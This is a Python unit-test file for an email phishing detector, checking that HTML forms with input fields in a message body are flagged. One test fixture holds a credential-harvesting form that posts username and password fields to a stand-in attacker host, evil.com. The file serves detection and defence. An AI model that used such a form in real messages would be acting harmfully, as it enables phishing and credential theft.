"""Unit tests for BodyContentAnalyzer — HTML form structural detection only.

Linguistic body signals (urgency, credential solicitation) are owned by
the LanguageAssessmentAnalyzer and tested in
``test_language_assessment_analyzer.py``."""

from __future__ import annotations

import pytest

from detection_engine.analyzers.body_content import BodyContentAnalyzer
from detection_engine.domain.email import EmailData, EmailHeaders
from detection_engine.domain.enums import SignalSeverity
from tests.email_fixtures import (
    EMPTY_MINIMAL,
    LEGIT_AMAZON_ORDER,
    LEGIT_MARKETING,
    build_email_data,
)


def _make_email(
    subject: str = "Test",
    body_text: str = "",
    body_html: str = "",
) -> EmailData:
    return EmailData(
        message_id="test-001",
        sender_address="test@example.com",
        sender_display_name="",
        recipient="user@example.com",
        subject=subject,
        body_text=body_text,
        body_html=body_html,
        headers=EmailHeaders([("From", "test@example.com"), ("To", "user@example.com")]),
    )


@pytest.fixture
def analyzer() -> BodyContentAnalyzer:
    return BodyContentAnalyzer()


class TestHtmlForm:
    def test_form_with_input_detected(self, analyzer: BodyContentAnalyzer):
        email = _make_email(
            body_html=(
                '<form action="http://evil.com/collect">'
                '<input type="text" name="user">'
                '<input type="password" name="pass">'
                "</form>"
            )
        )
        output = analyzer.analyze(email)
        form = [s for s in output.signals if s.id == "html_form_in_body"]
        assert len(form) == 1
        assert form[0].severity == SignalSeverity.CRITICAL
        assert form[0].confidence == 1.0

    def test_form_without_input_not_flagged(self, analyzer: BodyContentAnalyzer):
        email = _make_email(body_html="<form><p>No inputs here</p></form>")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_input_without_form_not_flagged(self, analyzer: BodyContentAnalyzer):
        email = _make_email(
            body_html='<div><input type="text" name="search"></div>'
        )
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_empty_html_not_flagged(self, analyzer: BodyContentAnalyzer):
        email = _make_email(body_html="")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_normal_html_email_not_flagged(self, analyzer: BodyContentAnalyzer):
        email = _make_email(
            body_html="<html><body><p>Hello world</p><a href='http://x.com'>Link</a></body></html>"
        )
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]


class TestNoLanguageSignals:
    """Body content keyword scanning was moved to LanguageAssessmentAnalyzer.
    Confirm BodyContentAnalyzer no longer fires on language alone."""

    def test_urgency_language_alone_emits_no_signal(self, analyzer: BodyContentAnalyzer):
        email = _make_email(body_text="Your account will be suspended within 24 hours.")
        output = analyzer.analyze(email)
        assert output.signals == ()

    def test_credential_request_alone_emits_no_signal(self, analyzer: BodyContentAnalyzer):
        email = _make_email(body_text="Please verify your password.")
        output = analyzer.analyze(email)
        assert output.signals == ()


class TestRealFixtures:
    def test_legit_amazon_no_signals(self, analyzer: BodyContentAnalyzer):
        email = build_email_data(LEGIT_AMAZON_ORDER["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0

    def test_legit_marketing_no_signals(self, analyzer: BodyContentAnalyzer):
        email = build_email_data(LEGIT_MARKETING["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0

    def test_empty_minimal_no_signals(self, analyzer: BodyContentAnalyzer):
        email = build_email_data(EMPTY_MINIMAL["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0
